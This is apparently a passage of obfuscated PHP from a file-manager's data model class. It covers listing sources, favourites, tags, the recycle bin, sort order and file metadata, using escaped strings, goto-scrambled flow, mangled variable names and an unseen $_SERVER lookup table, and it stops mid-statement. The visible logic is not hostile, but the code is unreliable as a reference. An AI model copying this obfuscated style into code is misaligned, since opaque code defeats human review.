$tableMeta = array("\164\x61\x62\x6c\x65\116\x61\x6d\x65" => "\151\157\x5f\x73\157\x75\162\x63\x65\137\155\145\164\141", "\x6d\145\x74\141\x46\151\145\x6c\144" => "\163\157\x75\162\x63\x65\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\151\155\x65", "\x74\151\x6d\145", "\x69\156\x73\x65\x72\164", "\146\x75\156\x63\164\151\157\x6e"), array("\143\x72\x65\141\x74\x65\x54\x69\155\145", "\x74\x69\155\145", "\x69\156\x73\145\x72\x74", "\146\x75\156\143\164\151\x6f\156"), array("\166\x69\145\167\124\x69\155\145", "\x74\151\155\145", "\151\x6e\x73\x65\x72\x74", "\x66\x75\x6e\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($döîğ›£ƒ—) { return $this->listSource(array($_SERVER[¬ı§†‰ú˜¼][393] => $döîğ›£ƒ—)); } public function typeName($Fš§‘½×á) { static $d•µÀ„‹ó = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\x6d", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $d•µÀ„‹ó[$Fš§‘½×á . $_SERVER[¬ı§†‰ú˜¼][33]]; } public function sourceListInfo($F¸¸‚İê¬, $bŞ¬Šê‹¾† = false) { goto EÄÎ»¯ÎÕ; a’´†¹ÀŸ: if (!$F¸¸‚İê¬) { return array(); } $cÇ½¹È¶‰í = $this->where(array($déêëéİÀ[394] => array($déêëéİÀ[7], $F¸¸‚İê¬)))->select(); $this->_listDataApply($cÇ½¹È¶‰í, $bŞ¬Šê‹¾†); goto fÏİ£è®‡˜; fÏİ£è®‡˜: return array_to_keyvalue($cÇ½¹È¶‰í, $déêëéİÀ[394]); goto F®ßÔ…Ãî; EÄÎ»¯ÎÕ: $déêëéİÀ =& $_SERVER[¬ı§†‰ú˜¼]; $F¸¸‚İê¬ = $F¸¸‚İê¬ ? $F¸¸‚İê¬ : array(); $F¸¸‚İê¬ = array_filter(array_unique($F¸¸‚İê¬)); goto a’´†¹ÀŸ; F®ßÔ…Ãî: } public function pathInfoFilter(&$eŠÛ¬ŸÃñ) { goto e‹„Î â¸§; e‹„Î â¸§: $B¯¿‡®õ‚ =& $_SERVER[¬ı§†‰ú˜¼]; static $A›±ôÄ¸ˆ = false; static $dè»¬Å±ÊÀ = false; goto b…‡„÷¬î—; fê±¹¦‡¿Ã: if (isset($eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[404]]) && $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[404]][$B¯¿‡®õ‚[405]] == -1) { $däåÌØ®Ùù = $dè»¬Å±ÊÀ; } $eŠÛ¬ŸÃñ = array_field_key($eŠÛ¬ŸÃñ, $däåÌØ®Ùù); return $eŠÛ¬ŸÃñ; goto AÓÒöæ÷¼õ; cÍå†Ë°ª§: $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[402]] = $this->typeName($eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[402]]); if ($eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[401]] != 1) { $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[168]] = $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[403]]; unset($eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[403]]); } $däåÌØ®Ùù = $A›±ôÄ¸ˆ; goto fê±¹¦‡¿Ã; b…‡„÷¬î—: if (!$A›±ôÄ¸ˆ) { goto f—¯³ˆ¹º¨; f—¯³ˆ¹º¨: $A•‹ƒÒŸ²‡ = $B¯¿‡®õ‚[395]; $A•‹ƒÒŸ²‡ .= $B¯¿‡®õ‚[396]; $A•‹ƒÒŸ²‡ .= $B¯¿‡®õ‚[397]; goto D‡Û™‘™Åó; D‡Û™‘™Åó: $cˆ‡Æ†Ğ Ç = $B¯¿‡®õ‚[398]; $CÍè®ª‘ã = explode($B¯¿‡®õ‚[47], $cˆ‡Æ†Ğ Ç); $A›±ôÄ¸ˆ = explode($B¯¿‡®õ‚[47], $A•‹ƒÒŸ²‡); goto FÃ³Â›‚Êˆ; FÃ³Â›‚Êˆ: $dè»¬Å±ÊÀ = array(); foreach ($A›±ôÄ¸ˆ as $DƒÅšÛ–Ê) { if (in_array($DƒÅšÛ–Ê, $CÍè®ª‘ã)) { continue; } $dè»¬Å±ÊÀ[] = $DƒÅšÛ–Ê; } goto dËÇù›Œ´; dËÇù›Œ´: } $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[76]] = $B¯¿‡®õ‚[399] . $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[394]] . $B¯¿‡®õ‚[400]; $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[29]] = $eŠÛ¬ŸÃñ[$B¯¿‡®õ‚[401]] == 1 ? $B¯¿‡®õ‚[77] : $B¯¿‡®õ‚[192]; goto cÍå†Ë°ª§; AÓÒöæ÷¼õ: } public function listUserFav() { goto AË›°‹ùñ—; bì‹¸ãÀ: $fÉ‘®ßá½ò = array_to_keyvalue($fÉ‘®ßá½ò, $CŠº±ÍŒË[33], $CŠº±ÍŒË[76]); if ($fÉ‘®ßá½ò) { $BÜ™´Œ…± = $this->listSource(array($CŠº±ÍŒË[408] => array($CŠº±ÍŒË[409], $fÉ‘®ßá½ò))); } $BÜ™´Œ…± = array_to_keyvalue($BÜ™´Œ…±[$CŠº±ÍŒË[366]], $CŠº±ÍŒË[394]); goto eŠÁÄâšµí; AË›°‹ùñ—: $CŠº±ÍŒË =& $_SERVER[¬ı§†‰ú˜¼]; $BîË‹ôê‡Á = Model($CŠº±ÍŒË[406])->listData(); $fÉ‘®ßá½ò = array_filter_by_field($BîË‹ôê‡Á, $CŠº±ÍŒË[29], $CŠº±ÍŒË[407]); goto bì‹¸ãÀ; eŠÁÄâšµí: foreach ($BîË‹ôê‡Á as &$cÉºË—“¶) { $cÉºË—“¶ = array($CŠº±ÍŒË[410] => $cÉºË—“¶[$CŠº±ÍŒË[392]], $CŠº±ÍŒË[411] => $cÉºË—“¶[$CŠº±ÍŒË[28]], $CŠº±ÍŒË[412] => $cÉºË—“¶[$CŠº±ÍŒË[76]], $CŠº±ÍŒË[413] => $cÉºË—“¶[$CŠº±ÍŒË[29]], $CŠº±ÍŒË[414] => $cÉºË—“¶[$CŠº±ÍŒË[193]], $CŠº±ÍŒË[415] => $cÉºË—“¶[$CŠº±ÍŒË[84]]); if ($cÉºË—“¶[$CŠº±ÍŒË[29]] == $CŠº±ÍŒË[407] && $BÜ™´Œ…±[$cÉºË—“¶[$CŠº±ÍŒË[76]]]) { $cÉºË—“¶[$CŠº±ÍŒË[85]] = $BÜ™´Œ…±[$cÉºË—“¶[$CŠº±ÍŒË[76]]]; } } unset($cÉºË—“¶); return $BîË‹ôê‡Á; goto F»î…’áÖÎ; F»î…’áÖÎ: } public function listUserTag($CîùòêÔö½) { goto cØåóÚƒ”´; f‚Ú×Ì÷·æ: $CöºÅš±ß‘ = array(); foreach ($Aè÷ÊÛÏ’ as $A‹«ŸšÉØÎ) { $A«Ÿñ‰Ù» = $A‹«ŸšÉØÎ[$AøÎàî¥àÂ[76]]; if (!$A«Ÿñ‰Ù») { continue; } if (!isset($CöºÅš±ß‘[$A«Ÿñ‰Ù»])) { $CöºÅš±ß‘[$A«Ÿñ‰Ù»] = array(); } $CöºÅš±ß‘[$A«Ÿñ‰Ù»][] = $A‹«ŸšÉØÎ[$AøÎàî¥àÂ[417]]; } $DÀ–©ËˆÎÏ = array(); goto AÒã»‹‹¹; cØåóÚƒ”´: $AøÎàî¥àÂ =& $_SERVER[¬ı§†‰ú˜¼]; if ($CîùòêÔö½ && !is_array($CîùòêÔö½)) { $CîùòêÔö½ = array($CîùòêÔö½); } $Aè÷ÊÛÏ’ = Model($AøÎàî¥àÂ[416])->listData(); goto f‚Ú×Ì÷·æ; E¬Ì²¿¸˜Ø: $eÖ÷®àîëƒ = array_to_keyvalue($D…ˆ†ÊÃç¨[$AøÎàî¥àÂ[74]], $AøÎàî¥àÂ[33], $AøÎàî¥àÂ[394]); $b±ÕÕ¦ÎÅÖ = array_merge($eÖ÷®àîëƒ, $Aå¨®°•†); foreach ($DÀ–©ËˆÎÏ as $A«Ÿñ‰Ù») { if (!in_array($A«Ÿñ‰Ù», $b±ÕÕ¦ÎÅÖ)) { $e¦ˆƒš•Ú[] = $A«Ÿñ‰Ù»; } } goto då†¬í¿™¯; då†¬í¿™¯: if ($e¦ˆƒš•Ú) { Model($AøÎàî¥àÂ[418])->removeBySource($e¦ˆƒš•Ú); } return $D…ˆ†ÊÃç¨; goto f²‰Ÿ—Ñ; CÍÈáÕºÜë: if (!$D…ˆ†ÊÃç¨ || count($DÀ–©ËˆÎÏ) == $D…ˆ†ÊÃç¨[$AøÎàî¥àÂ[363]][$AøÎàî¥àÂ[364]]) { return $D…ˆ†ÊÃç¨; } $e¦ˆƒš•Ú = array(); $Aå¨®°•† = array_to_keyvalue($D…ˆ†ÊÃç¨[$AøÎàî¥àÂ[75]], $AøÎàî¥àÂ[33], $AøÎàî¥àÂ[394]); goto E¬Ì²¿¸˜Ø; AÒã»‹‹¹: foreach ($CöºÅš±ß‘ as $Fö¿ÔõŠ => $BÈÄ‚áğÏÙ) { $Fˆ‰¢¯Ä¦ = !0; if (!$CîùòêÔö½) { $DÀ–©ËˆÎÏ[] = $Fö¿ÔõŠ; continue; } foreach ($CîùòêÔö½ as $cÑÒƒªññ) { if (!in_array($cÑÒƒªññ, $BÈÄ‚áğÏÙ)) { $Fˆ‰¢¯Ä¦ = !1; break; } } if ($Fˆ‰¢¯Ä¦) { $DÀ–©ËˆÎÏ[] = $Fö¿ÔõŠ; } } if (!$DÀ–©ËˆÎÏ) { return array(); } $D…ˆ†ÊÃç¨ = $this->listSource(array($AøÎàî¥àÂ[408] => array($AøÎàî¥àÂ[409], $DÀ–©ËˆÎÏ))); goto CÍÈáÕºÜë; f²‰Ÿ—Ñ: } public function listUserRecycle() { $CèŒï¥°‡ß =& $_SERVER[¬ı§†‰ú˜¼]; $Bö‹Ş¦İ¦Ğ = Model($CèŒï¥°‡ß[419])->listData(); if (!$Bö‹Ş¦İ¦Ğ) { return array(); } $A­¼ôï®Ç… = array($CèŒï¥°‡ß[408] => array($CèŒï¥°‡ß[409], $Bö‹Ş¦İ¦Ğ), $CèŒï¥°‡ß[420] => 1); return $this->listSource($A­¼ôï®Ç…); } public function listSource($BæÂğÅ‘í, $CæñÓ°˜… = 3000) { goto FƒÓĞ×ìÅ¡; b®×¾ó—¸: $d–è Õ‘«Ã = $this->field($C‚Ç³İš)->_makeOrder()->where($BæÂğÅ‘í)->selectPage($CæñÓ°˜…); $this->_listDataApply($d–è Õ‘«Ã[$DÄš™ôÎ[366]]); $this->_listMake($d–è Õ‘«Ã); goto DÎ‚ªîø“Ô; DÎ‚ªîø“Ô: return $d–è Õ‘«Ã; goto fåî½ÜéÓÖ; FƒÓĞ×ìÅ¡: $DÄš™ôÎ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($BæÂğÅ‘í[$DÄš™ôÎ[421]])) { $BæÂğÅ‘í[$DÄš™ôÎ[421]] = 0; } $C‚Ç³İš = $DÄš™ôÎ[422]; goto b®×¾ó—¸; fåî½ÜéÓÖ: } protected function _makeOrder() { goto Aë¬µÙÓŒ; Aë¬µÙÓŒ: $B„øĞÔŠá =& $_SERVER[¬ı§†‰ú˜¼]; $EëÆóØ†”’ = Model($B„øĞÔŠá[423])->get($B„øĞÔŠá[424]); $bä¥ÈêÍŒŠ = Model($B„øĞÔŠá[423])->get($B„øĞÔŠá[425]); goto EÆ¡—Ù¶¤ù; Eƒ³‘æ¬•: $cÕĞï•¬ = Input::get($B„øĞÔŠá[434], $B„øĞÔŠá[7], $bä¥ÈêÍŒŠ, array_keys($DíÓĞí¦’Â)); if (!in_array($b¤ÍÍÌäø¸, array_keys($C´”øÛÎæ¦))) { $b¤ÍÍÌäø¸ = $B„øĞÔŠá[28]; } if (!in_array($cÕĞï•¬, array_keys($DíÓĞí¦’Â))) { $b¤ÍÍÌäø¸ = $B„øĞÔŠá[426]; } goto c˜¥ºàµ¬; EÆ¡—Ù¶¤ù: $DíÓĞí¦’Â = array($B„øĞÔŠá[426] => $B„øĞÔŠá[427], $B„øĞÔŠá[428] => $B„øĞÔŠá[429]); $C´”øÛÎæ¦ = array($B„øĞÔŠá[28] => $B„øĞÔŠá[28], $B„øĞÔŠá[78] => $B„øĞÔŠá[78], $B„øĞÔŠá[168] => $B„øĞÔŠá[403], $B„øĞÔŠá[430] => $B„øĞÔŠá[430], $B„øĞÔŠá[431] => $B„øĞÔŠá[432], $B„øĞÔŠá[193] => $B„øĞÔŠá[193], $B„øĞÔŠá[84] => $B„øĞÔŠá[84]); $b¤ÍÍÌäø¸ = Input::get($B„øĞÔŠá[433], $B„øĞÔŠá[7], $EëÆóØ†”’, array_keys($C´”øÛÎæ¦)); goto Eƒ³‘æ¬•; c˜¥ºàµ¬: if ($b¤ÍÍÌäø¸ == $B„øĞÔŠá[28]) { } $cå×î˜Ú£ã = $B„øĞÔŠá[435] . $C´”øÛÎæ¦[$b¤ÍÍÌäø¸] . $B„øĞÔŠá[50] . $DíÓĞí¦’Â[$cÕĞï•¬]; return $this->order(rtrim(trim($cå×î˜Ú£ã), $B„øĞÔŠá[47])); goto A”¸†ÄòŠ; A”¸†ÄòŠ: } protected function _listDataApplyItem($F¿‘ñÎÆÜÙ, $f˜Ïææƒ£Å = false) { $f²Ë®™‹ç = array($F¿‘ñÎÆÜÙ); $this->_listDataApply($f²Ë®™‹ç, $f˜Ïææƒ£Å); return $f²Ë®™‹ç[0]; } protected function _listDataApply(&$f²¿²°†‹Õ, $Dåø»ñïÄ = false) { goto AÆ˜˜Õ“°¤; AµùÚù”¦Û: $E¦æ«Ó…Ïµ = array_unique($E¦æ«Ó…Ïµ); $this->_listSourceCache($f²¿²°†‹Õ); if (!$Dåø»ñïÄ) { $this->_listAppendMeta($f²¿²°†‹Õ, $E¦æ«Ó…Ïµ); $this->_listAppendFileMeta($f²¿²°†‹Õ, $E¦æ«Ó…Ïµ); $this->_listAppendChildren($f²¿²°†‹Õ, $E¦æ«Ó…Ïµ); } goto f•îÁ·ÏÕ®; dªëó¥ìš—: $this->_listAppendUser($f²¿²°†‹Õ); $this->_listFilterInfo($f²¿²°†‹Õ, $Dåø»ñïÄ); goto b–´§çƒ; AÆ˜˜Õ“°¤: $e¶¿„³˜Ö =& $_SERVER[¬ı§†‰ú˜¼]; if (!$f²¿²°†‹Õ) { $f²¿²°†‹Õ = array(); return; } $E¦æ«Ó…Ïµ = array_to_keyvalue($f²¿²°†‹Õ, $e¶¿„³˜Ö[33], $e¶¿„³˜Ö[394]); goto AµùÚù”¦Û; f•îÁ·ÏÕ®: $this->_listAppendPath($f²¿²°†‹Õ); $this->_listAppendAuth($f²¿²°†‹Õ); $this->_listAppendSourceInfo($f²¿²°†‹Õ, $E¦æ«Ó…Ïµ); goto dªëó¥ìš—; b–´§çƒ: } protected function _listSourceCache($dâù²Üñâå) { $FÆğ³â£å =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($dâù²Üñâå as $c„§˜²øÏŠ) { self::$cacheSourceInfo[$FÆğ³â£å[436] . $c„§˜²øÏŠ[$FÆğ³â£å[394]]] = $c„§˜²øÏŠ; } } protected function _listFilterInfo(&$CÅ‘¿Æ¯­‘, $c¸ÂÃ²¯Û = false) { $cÆÇóù¬™„ =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($CÅ‘¿Æ¯­‘ as &$e²´Ù©†Ä½) { $e²´Ù©†Ä½ = $this->pathInfoFilter($e²´Ù©†Ä½); self::$cachePathInfo[$cÆÇóù¬™„[437] . intval($c¸ÂÃ²¯Û) . $cÆÇóù¬™„[438] . $e²´Ù©†Ä½[$cÆÇóù¬™„[394]]] = $e²´Ù©†Ä½; } unset($e²´Ù©†Ä½); } protected function _listMake(&$Fç½‹ù‰Á¦) { $CÇ´ß¾ÜŞÂ =& $_SERVER[¬ı§†‰ú˜¼]; $Fç½‹ù‰Á¦[$CÇ´ß¾ÜŞÂ[75]] = array(); $Fç½‹ù‰Á¦[$CÇ´ß¾ÜŞÂ[74]] = array(); foreach ($Fç½‹ù‰Á¦[$CÇ´ß¾ÜŞÂ[366]] as $A¤®êçºÃ) { $fÍî÷´×Õ– = $A¤®êçºÃ[$CÇ´ß¾ÜŞÂ[401]] == 1 ? $CÇ´ß¾ÜŞÂ[75] : $CÇ´ß¾ÜŞÂ[74]; $Fç½‹ù‰Á¦[$fÍî÷´×Õ–][] = $A¤®êçºÃ; } unset($Fç½‹ù‰Á¦[$CÇ´ß¾ÜŞÂ[366]]); } protected function _listAppendMeta(&$C¶Ó²£ºÄŠ, $bÌ¿‘ë‰—Ö) { goto BÅ¨¾Ãä¿Ä; a¶‡š‹¥Î„: if (!$EÌ©ê¶ã¸Õ) { return; } $DÛğŒœŠˆ = array($eÅ¢¥œŒ¾â[441], $eÅ¢¥œŒ¾â[442]); $AŞÆåÖ¯²› = array(); goto b¹É¨…Š…‰; BÅ¨¾Ãä¿Ä: $eÅ¢¥œŒ¾â =& $_SERVER[¬ı§†‰ú˜¼]; $bİå¢ºğ’Œ = array($eÅ¢¥œŒ¾â[408] => array($eÅ¢¥œŒ¾â[409], $bÌ¿‘ë‰—Ö)); $EÌ©ê¶ã¸Õ = Model($eÅ¢¥œŒ¾â[439])->field($eÅ¢¥œŒ¾â[440])->where($bİå¢ºğ’Œ)->select(); goto a¶‡š‹¥Î„; b¹É¨…Š…‰: foreach ($EÌ©ê¶ã¸Õ as $eÏõõ£Ì™) { if (!isset($AŞÆåÖ¯²›[$eÏõõ£Ì™[$eÅ¢¥œŒ¾â[394]]])) { $AŞÆåÖ¯²›[$eÏõõ£Ì™[$eÅ¢¥œŒ¾â[394]]] = array(); } if (in_array($eÏõõ£Ì™[$eÅ¢¥œŒ¾â[93]], $DÛğŒœŠˆ)) { continue; } $AŞÆåÖ¯²›[$eÏõõ£Ì™[$eÅ¢¥œŒ¾â[394]]][$eÏõõ£Ì™[$eÅ¢¥œŒ¾â[93]]] = $eÏõõ£Ì™[$eÅ¢¥œŒ¾â[371]]; } foreach ($C¶Ó²£ºÄŠ as &$A—ÒÜë¤™Ğ) { $A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[443]] = !1; if (isset($AŞÆåÖ¯²›[$A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[394]]])) { $A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[443]] = $AŞÆåÖ¯²›[$A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[394]]]; } if ($this->fileIsLock($A—ÒÜë¤™Ğ) && $A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[404]]) { $CµÄäß¹‘ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[404]][$eÅ¢¥œŒ¾â[405]] = AuthModel::authDisable($A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[404]][$eÅ¢¥œŒ¾â[405]], $CµÄäß¹‘); $A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[404]][$eÅ¢¥œŒ¾â[444]][$eÅ¢¥œŒ¾â[404]] = $A—ÒÜë¤™Ğ[$eÅ¢¥œŒ¾â[404]][$eÅ¢¥œŒ¾â[405]]; } } unset($A—ÒÜë¤™Ğ); goto F¶œà‡øàñ; F¶œà‡øàñ: } protected function _listAppendFileMeta(&$Fè‚½ÂÉ, $c‰Ø¬îãÊã) { goto EŒÊ“ùŠßÂ; eƒ¨êÍôé: foreach ($Fè‚½ÂÉ as &$b²†®Í¼) { goto aÕ™Ìïœ¼; aÕ™Ìïœ¼: $Eà¸ÁÍ¯îÛ = $b²†®Í¼[$c¢âªÜë¸[445]]; if (!$Eà¸ÁÍ¯îÛ || !is_array($F‹·±áÒù´[$Eà¸ÁÍ¯îÛ])) { continue; } $fº¬Ó™…‰¼ = $F‹·±áÒù´[$Eà¸ÁÍ¯îÛ]; goto a¤š¾ğÈÀ; CÃËèî÷²ì: unset($F‹·±áÒù´[$Eà¸ÁÍ¯îÛ][$c¢âªÜë¸[76]]); $a¿¸‡§Âƒ£ = is_array($AŸµ†ñ£×ê[$Eà¸ÁÍ¯îÛ]) ? $AŸµ†ñ£×ê[$Eà¸ÁÍ¯îÛ] : array(); $b²†®Í¼[$c¢âªÜë¸[164]] = array_merge($a¿¸‡§Âƒ£, $F‹·±áÒù´[$Eà¸ÁÍ¯îÛ]); goto AÜŞ³Ğ‚ª; a¤š¾ğÈÀ: $fº¬Ó™…‰¼[$c¢âªÜë¸[78]] = $b²†®Í¼[$c¢âªÜë¸[78]]; $fº¬Ó™…‰¼[$c¢âªÜë¸[28]] = $b²†®Í¼[$c¢âªÜë¸[28]]; if (!isset(self::$cacheFileInfo[$c¢âªÜë¸[451] . $Eà¸ÁÍ¯îÛ])) { self::$cacheFileInfo[$c¢âªÜë¸[451] . $Eà¸ÁÍ¯îÛ] = array_merge(array(), $fº¬Ó™…‰¼); } goto CÃËèî÷²ì; AÜŞ³Ğ‚ª: if (isset($b²†®Í¼[$c¢âªÜë¸[164]][$c¢âªÜë¸[163]])) { $b²†®Í¼[$c¢âªÜë¸[163]] = json_decode($b²†®Í¼[$c¢âªÜë¸[164]][$c¢âªÜë¸[163]], !0); unset($b²†®Í¼[$c¢âªÜë¸[164]][$c¢âªÜë¸[163]]); } goto a®ÕˆÇ; a®ÕˆÇ: } unset($b²†®Í¼); goto B™áôí“¸”; Cã‘¶ù¤ŸŠ: $F‹·±áÒù´ = Model($c¢âªÜë¸[448])->field($aøÄåÑŸ)->where($f²ç¦µ÷»)->select(); $F‹·±áÒù´ = array_to_keyvalue($F‹·±áÒù´, $c¢âªÜë¸[445]); $CŒ¼ÅŸµÁÉ = Model($c¢âªÜë¸[449])->field($c¢âªÜë¸[450])->where($f²ç¦µ÷»)->select(); goto dƒ¢‚Èè‚®; dƒ¢‚Èè‚®: $CŒ¼ÅŸµÁÉ = $CŒ¼ÅŸµÁÉ ? $CŒ¼ÅŸµÁÉ : array(); $AŸµ†ñ£×ê = array(); foreach ($CŒ¼ÅŸµÁÉ as $dŸÈ‘Ì•º°) { if (!isset($AŸµ†ñ£×ê[$dŸÈ‘Ì•º°[$c¢âªÜë¸[445]]])) { $AŸµ†ñ£×ê[$dŸÈ‘Ì•º°[$c¢âªÜë¸[445]]] = array(); } $AŸµ†ñ£×ê[$dŸÈ‘Ì•º°[$c¢âªÜë¸[445]]][$dŸÈ‘Ì•º°[$c¢âªÜë¸[93]]] = $dŸÈ‘Ì•º°[$c¢âªÜë¸[371]]; } goto eƒ¨êÍôé; DÒ”Çö­öÁ: if (!$Cï®†œîÖù) { return; } $f²ç¦µ÷» = array($c¢âªÜë¸[446] => array($c¢âªÜë¸[409], $Cï®†œîÖù)); $aøÄåÑŸ = $c¢âªÜë¸[447]; goto Cã‘¶ù¤ŸŠ; EŒÊ“ùŠßÂ: $c¢âªÜë¸ =& $_SERVER[¬ı§†‰ú˜¼]; $Cï®†œîÖù = array_to_keyvalue($Fè‚½ÂÉ, $c¢âªÜë¸[33], $c¢âªÜë¸[445]); $Cï®†œîÖù = array_filter(array_unique($Cï®†œîÖù)); goto DÒ”Çö­öÁ; B™áôí“¸”: } protected function _listAppendSourceInfo(&$b·ÈÄ¬Èä˜, $c°ñìö°â) { goto a‘®“ÂƒĞã; C·³ñ®Ó÷‡: return $b·ÈÄ¬Èä˜; goto E­åª‘±Ä; a‘®“ÂƒĞã: $Cª´¦—¼è¶ =& $_SERVER[¬ı§†‰ú˜¼]; if (!defined($Cª´¦—¼è¶[452])) { return; } $E®İÜŞ³Š = Model($Cª´¦—¼è¶[453])->listData(); goto CÏ¡¿ÂÅ§ˆ; CÏ¡¿ÂÅ§ˆ: $cö ëˆÌÆ = Model($Cª´¦—¼è¶[416])->listData(); $FŒœÓ ­êô = Model($Cª´¦—¼è¶[406])->listData(); $BøÏÀÇ«Èß = Model($Cª´¦—¼è¶[454])->listSimple(); goto fß¶»£àãß; fß¶»£àãß: $cœªÔĞ›ÎÒ = array_to_keyvalue($E®İÜŞ³Š, $Cª´¦—¼è¶[392]); $d½İÃ¦ï“ø = array_to_keyvalue_group($cö ëˆÌÆ, $Cª´¦—¼è¶[76], $Cª´¦—¼è¶[417]); $F˜¼Øšš˜“ = array_to_keyvalue($FŒœÓ ­êô, $Cª´¦—¼è¶[76]); goto B¾¨´ÍÇÁˆ; B¾¨´ÍÇÁˆ: $FéÍ¶±Àğ¦ = array_to_keyvalue_group($BøÏÀÇ«Èß, $Cª´¦—¼è¶[394]); foreach ($b·ÈÄ¬Èä˜ as &$a¬•Ÿ½»Ş) { $a¬•Ÿ½»Ş[$Cª´¦—¼è¶[85]] = array($Cª´¦—¼è¶[455] => 0, $Cª´¦—¼è¶[456] => 0, $Cª´¦—¼è¶[457] => 0); if (isset($F˜¼Øšš˜“[$a¬•Ÿ½»Ş[$Cª´¦—¼è¶[394]]])) { $a¬•Ÿ½»Ş[$Cª´¦—¼è¶[85]][$Cª´¦—¼è¶[458]] = 1; $a¬•Ÿ½»Ş[$Cª´¦—¼è¶[85]][$Cª´¦—¼è¶[459]] = $F˜¼Øšš˜“[$a¬•Ÿ½»Ş[$Cª´¦—¼è¶[394]]][$Cª´¦—¼è¶[28]]; } if (isset($d½İÃ¦ï“ø[$a¬•Ÿ½»Ş[$Cª´¦—¼è¶[394]]])) { $a¬•Ÿ½»Ş[$Cª´¦—¼è¶[85]][$Cª´¦—¼è¶[460]] = array(); foreach ($d½İÃ¦ï“ø[$a¬•Ÿ½»Ş[$Cª´¦—¼è¶[394]]] as $E£ö‡œî‹) { $b‡ø‘Êƒœñ = $cœªÔĞ›ÎÒ[$E£ö‡œî‹]; $a¬•Ÿ½»Ş[$Cª´¦—¼è¶[85]][$Cª´¦—¼è¶[460]][] = array($Cª´¦—¼è¶[461] => $b‡ø‘Êƒœñ[$Cª´¦—¼è¶[392]], $Cª´¦—¼è¶[411] => $b‡ø‘Êƒœñ[$Cª´¦—¼è¶[28]], $Cª´¦—¼è¶[462] => $b‡ø‘Êƒœñ[$Cª´¦—¼è¶[463]]); } } if (isset($FéÍ¶±Àğ¦[$a¬•Ÿ½»Ş[$Cª´¦—¼è¶[394]]])) { $a¬•Ÿ½»Ş[$Cª´¦—¼è¶[85]][$Cª´¦—¼è¶[464]] = array(); foreach ($FéÍ¶±Àğ¦[$a¬•Ÿ½»Ş[$Cª´¦—¼è¶[394]]] as $BÇñšˆŠ••) { $a¬•Ÿ½»Ş[$Cª´¦—¼è¶[85]][$Cª´¦—¼è¶[464]] = array($Cª´¦—¼è¶[465] => $BÇñšˆŠ••[$Cª´¦—¼è¶[466]], $Cª´¦—¼è¶[467] => $BÇñšˆŠ••[$Cª´¦—¼è¶[468]], $Cª´¦—¼è¶[469] => $BÇñšˆŠ••[$Cª´¦—¼è¶[394]], $Cª´¦—¼è¶[470] => $BÇñšˆŠ••[$Cª´¦—¼è¶[471]], $Cª´¦—¼è¶[472] => $BÇñšˆŠ••[$Cª´¦—¼è¶[473]], $Cª´¦—¼è¶[474] => $BÇñšˆŠ••[$Cª´¦—¼è¶[474]], $Cª´¦—¼è¶[475] => $BÇñšˆŠ••[$Cª´¦—¼è¶[475]]); } } } unset($a¬•Ÿ½»Ş); goto C·³ñ®Ó÷‡; E­åª‘±Ä: } protected function _listAppendChildren(&$dÒÙ³¡êµ¦, $f±ŞºÛëñ) { goto E½³»á®ëŠ; A¬¼±ô½Ê: $Dù‚¤¥Ìˆ• = array(); foreach ($Bâ‡Š Ğµ„ as $bƒ¥ôë¯ÒÌ) { $d…èƒãÒã… = $bƒ¥ôë¯ÒÌ[$bĞßãÂÙÕ[476]]; $Bù‡Â‡ƒ¨ = $bƒ¥ôë¯ÒÌ[$bĞßãÂÙÕ[401]] == $bĞßãÂÙÕ[87] ? $bĞßãÂÙÕ[203] : $bĞßãÂÙÕ[202]; if (!isset($Dù‚¤¥Ìˆ•[$d…èƒãÒã…])) { $Dù‚¤¥Ìˆ•[$d…èƒãÒã…] = array($bĞßãÂÙÕ[202] => 0, $bĞßãÂÙÕ[203] => 0); } $Dù‚¤¥Ìˆ•[$d…èƒãÒã…][$Bù‡Â‡ƒ¨] += $bƒ¥ôë¯ÒÌ[$bĞßãÂÙÕ[478]]; } foreach ($dÒÙ³¡êµ¦ as &$D‚è‡½©ó) { if (!$D‚è‡½©ó[$bĞßãÂÙÕ[401]]) { continue; } $BÇ¢’æìª = is_array($Dù‚¤¥Ìˆ•[$D‚è‡½©ó[$bĞßãÂÙÕ[394]]]) ? $Dù‚¤¥Ìˆ•[$D‚è‡½©ó[$bĞßãÂÙÕ[394]]] : $a…öÀºö’‡; $D‚è‡½©ó[$bĞßãÂÙÕ[203]] = $BÇ¢’æìª[$bĞßãÂÙÕ[203]]; $D‚è‡½©ó[$bĞßãÂÙÕ[202]] = $BÇ¢’æìª[$bĞßãÂÙÕ[202]]; unset($D‚è‡½©ó[$bĞßãÂÙÕ[403]]); } goto B·×‡¥ˆÌ; AÉÃí†ñª×: foreach ($dÒÙ³¡êµ¦ as &$D‚è‡½©ó) { if (!$D‚è‡½©ó[$bĞßãÂÙÕ[401]]) { continue; } $B¾­÷„¹Ã‹[] = $D‚è‡½©ó[$bĞßãÂÙÕ[394]]; } unset($D‚è‡½©ó); if 